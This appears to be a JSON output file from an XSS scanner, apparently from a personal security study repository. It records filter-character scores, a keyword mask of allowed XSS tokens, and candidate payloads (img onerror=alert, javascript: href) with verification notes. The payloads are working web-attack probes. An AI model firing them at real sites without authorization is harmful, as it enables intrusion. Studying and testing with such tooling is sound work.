@@ -1,0 +1,170 @@
+{
+  "generated_by": "recommend_payload.py",
+  "generated_at": "2026-10-17T20:04:57.425409",
+  "source_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/SecurityPlatform/log/20261017-200457-xss_reflection_analysis.json",
+  "source_keyword_analysis": "/Users/alessandrorumampuk/Documents/GitHub/AlessandroStudyNotes/AlessandroStudyNotes/Cybersecurity/SecurityPlatform/log/20261017-200457-xss_keyword_analysis.json",
+  "reflections": [
+    {
+      "reflection_index": 1,
+      "context": "attr",
+      "quote": "\"",
+      "scores": {
+        "'": 0,
+        "\"": 0,
+        ">": 0,
+        "<": 0,
+        "/": 100,
+        "\\": 100
+      },
+      "keyword_mask": {
+        "parentheses": true,
+        "backtick": true,
+        "alert": true,
+        "confirm": true,
+        "prompt": true,
+        "script_tag": false,
+        "javascript_proto": true,
+        "onerror": true,
+        "img_tag": false,
+        "entity_lt": false,
+        "srcdoc": true,
+        "onload": true,
+        "ontoggle": true,
+        "autofocus": true,
+        "onfocus": true,
+        "print": true,
+        "svg_tag": false,
+        "details_tag": false,
+        "body_tag": false,
+        "iframe_tag": false,
+        "call_alert": true,
+        "call_confirm": true,
+        "call_prompt": true,
+        "call_print": true,
+        "tick_alert": true,
+        "tick_confirm": true,
+        "tick_prompt": true,
+        "pair_img_onerror": true,
+        "pair_svg_onload": true,
+        "pair_details_ontoggle": true,
+        "pair_body_onload": true,
+        "pair_iframe_onload": true,
+        "close_script": false,
+        "close_title": false,
+        "close_noscript": false,
+        "close_style": false,
+        "close_iframe": false,
+        "js_break_squote": false,
+        "js_break_dquote": false,
+        "proto_href": true,
+        "case_script": true,
+        "case_onload": true,
+        "case_proto": true,
+        "newline": true,
+        "comment_close": true,
+        "interp": true,
+        "rand_tag": false
+      },
+      "candidates": []
+    },
+    {
+      "reflection_index": 2,
+      "context": "html",
+      "quote": "\"",
+      "scores": {
+        "'": 100,
+        "\"": 100,
+        ">": 100,
+        "<": 100,
+        "/": 100,
+        "\\": 100
+      },
+      "keyword_mask": {
+        "parentheses": true,
+        "backtick": true,
+        "alert": true,
+        "confirm": true,
+        "prompt": true,
+        "script_tag": false,
+        "javascript_proto": true,
+        "onerror": true,
+        "img_tag": true,
+        "entity_lt": true,
+        "srcdoc": true,
+        "onload": true,
+        "ontoggle": true,
+        "autofocus": true,
+        "onfocus": true,
+        "print": true,
+        "svg_tag": false,
+        "details_tag": false,
+        "body_tag": false,
+        "iframe_tag": false,
+        "call_alert": true,
+        "call_confirm": true,
+        "call_prompt": true,
+        "call_print": true,
+        "tick_alert": true,
+        "tick_confirm": true,
+        "tick_prompt": true,
+        "pair_img_onerror": true,
+        "pair_svg_onload": true,
+        "pair_details_ontoggle": true,
+        "pair_body_onload": true,
+        "pair_iframe_onload": true,
+        "close_script": false,
+        "close_title": false,
+        "close_noscript": false,
+        "close_style": false,
+        "close_iframe": false,
+        "js_break_squote": false,
+        "js_break_dquote": false,
+        "proto_href": true,
+        "case_script": true,
+        "case_onload": true,
+        "case_proto": true,
+        "newline": true,
+        "comment_close": true,
+        "interp": true,
+        "rand_tag": false
+      },
+      "candidates": [
+        {
+          "payload": "<img src=x vvm{id} onerror=alert(1)>",
+          "technique": "img onerror handler",
+          "case_ref": "body_direct",
+          "efficiency": 100
+        },
+        {
+          "payload": "<img src=x vvm{id} onerror=alert`1`>",
+          "technique": "img onerror handler",
+          "case_ref": "body_direct",
+          "efficiency": 100
+        },
+        {
+          "payload": "<a vvm{id} href=\"javascript:alert(1)\">XSS</a>",
+          "technique": "javascript: protocol href",
+          "case_ref": "protocol",
+          "efficiency": 100
+        }
+      ],
+      "verification": [
+        {
+          "payload": "<img src=x vvmbfnuqr onerror=alert(1)>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<img src=x vvmukpqwg onerror=alert`1`>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        },
+        {
+          "payload": "<a vvmocteri href=\"javascript:alert(1)\">XSS</a>",
+          "confidence": "R",
+          "evidence": "marker reflected but not in executable position"
+        }
+      ]
+    }
+  ]
+}
